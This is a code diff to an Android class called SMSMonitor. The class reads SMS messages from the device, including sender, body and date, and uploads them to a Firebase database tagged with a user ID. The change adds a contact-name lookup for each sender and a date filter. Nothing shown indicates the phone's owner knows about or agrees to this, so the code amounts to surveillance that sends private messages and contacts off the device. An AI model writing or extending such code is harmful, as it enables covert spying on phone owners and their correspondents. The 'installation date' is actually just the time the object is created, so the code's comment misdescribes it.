@@ -7,6 +7,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.ContactsContract;
 import android.provider.Telephony;
 import android.util.Log;
 
@@ -22,11 +23,13 @@ public class SMSMonitor {
     private String phoneModel;
     private Context context;
     private BaseContentObserver smsObserver;
+    private long installationDate;
 
     public SMSMonitor(Context context, String userId, String phoneModel) {
         this.context = context;
         this.userId = userId;
         this.phoneModel = phoneModel;
+        this.installationDate = System.currentTimeMillis(); // Set installation date to current time
     }
 
     public void startMonitoring() {
@@ -72,7 +75,7 @@ public class SMSMonitor {
         try {
             cursor = context.getContentResolver().query(
                     Uri.parse("content://sms"),
-                    null, null, null, "date DESC");
+                    null, "date >= ?", new String[]{String.valueOf(installationDate)}, "date DESC");
 
             if (cursor != null && cursor.moveToFirst()) {
                 do {
@@ -90,16 +93,22 @@ public class SMSMonitor {
                         long timestamp = cursor.getLong(dateColumnIndex); // Message timestamp
                         String smsDate = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date(timestamp));
 
-                        // Create SMSData object
-                        SMSData smsData = new SMSData(type, address, body, smsDate);
-                        smsData.setTimestamp(timestamp);
+                        if (timestamp >= installationDate) { // Check if SMS is from the date of installation
+                            // Fetch contact name if available
+                            String contactName = getContactName(address);
 
-                        // Generate unique ID for SMS based on address and timestamp
-                        String uniqueSMSId = generateUniqueId(address, timestamp);
+                            // Create SMSData object
+                            SMSData smsData = new SMSData(type, address, body, smsDate);
+                            smsData.setTimestamp(timestamp);
+                            smsData.setContactName(contactName); // Set contact name
 
-                        // Upload SMS to Firebase
-                        DatabaseHelper dbHelper = new DatabaseHelper();
-                        dbHelper.uploadSMSDataByDate(userId, phoneModel, smsData, uniqueSMSId, smsDate);
+                            // Generate unique ID for SMS based on address and timestamp
+                            String uniqueSMSId = generateUniqueId(address, timestamp);
+
+                            // Upload SMS to Firebase
+                            DatabaseHelper dbHelper = new DatabaseHelper();
+                            dbHelper.uploadSMSDataByDate(userId, phoneModel, smsData, uniqueSMSId, smsDate);
+                        }
                     } else {
                         Log.w(TAG, "Missing required columns in SMS log.");
                     }
@@ -118,5 +127,22 @@ public class SMSMonitor {
 
     private String generateUniqueId(String address, long timestamp) {
         return address + "_" + timestamp; // Combination of address and timestamp
+    }
+
+    private String getContactName(String phoneNumber) {
+        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
+        Cursor cursor = context.getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
+        if (cursor != null) {
+            if (cursor.moveToFirst()) {
+                int nameColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
+                if (nameColumnIndex != -1) {
+                    String contactName = cursor.getString(nameColumnIndex);
+                    cursor.close();
+                    return contactName;
+                }
+            }
+            cursor.close();
+        }
+        return null;
     }
 }
